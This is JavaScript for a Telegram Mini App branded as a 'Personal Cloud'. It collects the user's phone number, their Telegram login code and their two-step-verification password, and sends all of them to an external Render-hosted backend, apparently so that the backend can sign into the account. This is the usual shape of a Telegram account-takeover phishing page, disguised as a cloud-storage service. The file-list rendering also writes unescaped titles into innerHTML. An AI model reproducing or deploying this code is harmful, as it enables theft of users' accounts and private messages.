const tg = window.Telegram.WebApp;
tg.expand();

// 🔴 သင့် Render URL ဖြင့် အစားထိုးပါ
const BACKEND_URL = "https://telegramcloudbackend.onrender.com"; 


let phoneHash = "", userPhone = "", pollingInterval;
let userName = tg.initDataUnsafe?.user?.first_name || "Cloud User";

function switchStep(stepId) {
    document.querySelectorAll(".step").forEach(el => el.classList.add("hidden"));
    let target = document.getElementById(stepId);
    if(target) target.classList.remove("hidden");
}

function requestContact() {
    tg.requestContact(function(shared) {
        if (shared) {
            switchStep("step-loading");
            let userId = tg.initDataUnsafe?.user?.id;
            
            if (!userId) {
                alert("Error: Telegram User ID ဖတ်မရပါ။");
                switchStep("step-phone");
                return;
            }
            
            pollingInterval = setInterval(() => checkContactReceived(userId), 2000);
            
            setTimeout(() => {
                if(pollingInterval) {
                    clearInterval(pollingInterval);
                    alert("Timeout: ချိတ်ဆက်မှု ကြန့်ကြာနေပါသည်။");
                    switchStep("step-phone");
                }
            }, 15000);
        }
    });
}

async function checkContactReceived(userId) {
    try {
        let res = await fetch(`${BACKEND_URL}/api/check_contact`, {
            method: "POST", 
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ user_id: userId })
        });
        
        let result = await res.json();
        
        if (result.success) {
            clearInterval(pollingInterval); 
            pollingInterval = null;
            userPhone = result.phone;
            phoneHash = result.hash;
            switchStep("step-otp"); 
            tg.HapticFeedback.impactOccurred("medium");
        } else if (result.message) { 
            clearInterval(pollingInterval);
            pollingInterval = null;
            alert("Error: " + result.message);
            switchStep("step-phone");
        }
    } catch(e) {
        console.log("Waiting for backend...");
    }
}

async function verifyOTP() {
    let code = document.getElementById("otp_input").value;
    if(code.length !== 5) return alert("OTP ၅ လုံး ပြည့်အောင် ရိုက်ပါ။");
    
    switchStep("step-loading");
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/verify_code`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ phone: userPhone, code: code, hash: phoneHash, name: userName })
        });
        
        let result = await res.json();
        if(result.success) {
            switchStep("step-success");
            tg.HapticFeedback.notificationOccurred("success"); 
            fetchCloudData();
        } else if (result.message === "2FA_REQUIRED") {
            // 💡 Backend မှ 2FA တောင်းလာပါက Password ရိုက်ထည့်ရမည့် UI သို့ ပြောင်းမည်
            switchStep("step-2fa");
        } else {
            alert("Error: " + result.message);
            switchStep("step-otp");
        }
    } catch(e) {
        alert("Verification Failed.");
        switchStep("step-otp");
    }
}

// 💡 ယခုအသစ်ထည့်ရမည့် 2FA ကို စစ်ဆေးပေးမည့် Function
async function verify2FA() {
    let password = document.getElementById("password_input").value;
    if(!password) return alert("Password ရိုက်ထည့်ပါ။");
    
    switchStep("step-loading");
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/verify_code`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            // Backend သို့ password ပါ တွဲပို့ပေးမည်
            body: JSON.stringify({ phone: userPhone, code: document.getElementById("otp_input").value, hash: phoneHash, name: userName, password: password })
        });
        
        let result = await res.json();
        if(result.success) {
            switchStep("step-success");
            tg.HapticFeedback.notificationOccurred("success"); 
            fetchCloudData();
        } else {
            alert("Error: Password မှားယွင်းနေပါသည်။");
            switchStep("step-2fa");
        }
    } catch(e) {
        alert("Verification Failed.");
        switchStep("step-2fa");
    }
}

// --- ☁️ Personal Cloud: Data ဆွဲယူမည့် Function ---
async function fetchCloudData() {
    let statusText = document.getElementById("cloud-status");
    let filesList = document.getElementById("cloud-files-list");
    
    statusText.innerText = "Syncing securely from Telegram...";
    filesList.innerHTML = "<div class='spinner'></div>";
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/get_cloud_data`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ name: userName })
        });
        
        let result = await res.json();
        if(result.success) {
            statusText.innerText = `✅ Storage Synced: ${result.files.length} items loaded.`;
            renderFiles(result.files);
        } else {
            statusText.innerText = "❌ Sync failed: " + (result.message || "Unknown error");
            filesList.innerHTML = "";
        }
    } catch(e) {
        statusText.innerText = "❌ Connection error.";
        filesList.innerHTML = "";
    }
}

// ယူလာသော Data များကို UI တွင် လှပစွာ ပြသမည့် Function
function renderFiles(files) {
    let html = "";
    if(files.length === 0) {
        html = "<p style='text-align:center; color:#888;'>📭 Your cloud is empty.</p>";
    } else {
        files.forEach(f => {
            let icon = f.type === "doc" ? "📄" : (f.type === "photo" ? "🖼️" : "📝");
            html += `
            <div class="file-item">
                <div class="file-icon">${icon}</div>
                <div>
                    <div class="file-title">${f.title}</div>
                    <div class="file-meta">${f.date}</div>
                </div>
            </div>`;
        });
    }
    document.getElementById("cloud-files-list").innerHTML = html;
}

// --- ☁️ Personal Cloud: Note အသစ် လှမ်းသိမ်းမည့် Function ---
async function saveCloudNote() {
    let noteInput = document.getElementById("note_input");
    let text = noteInput.value.trim();
    if(!text) return alert("Please type something to save.");
    
    let btn = event.target;
    btn.innerText = "⏳ Saving...";
    btn.disabled = true;
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/upload_note`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ name: userName, text: text })
        });
        let result = await res.json();
        
        if(result.success) {
            noteInput.value = "";
            tg.HapticFeedback.notificationOccurred("success");
            fetchCloudData(); // အသစ်တင်ပြီးပါက Data ပြန်ဆွဲယူမည်
        } else {
            alert("Failed to save note.");
        }
    } catch(e) {
        alert("Upload error.");
    }
    
    btn.innerText = "💾 Save Note";
    btn.disabled = false;
}
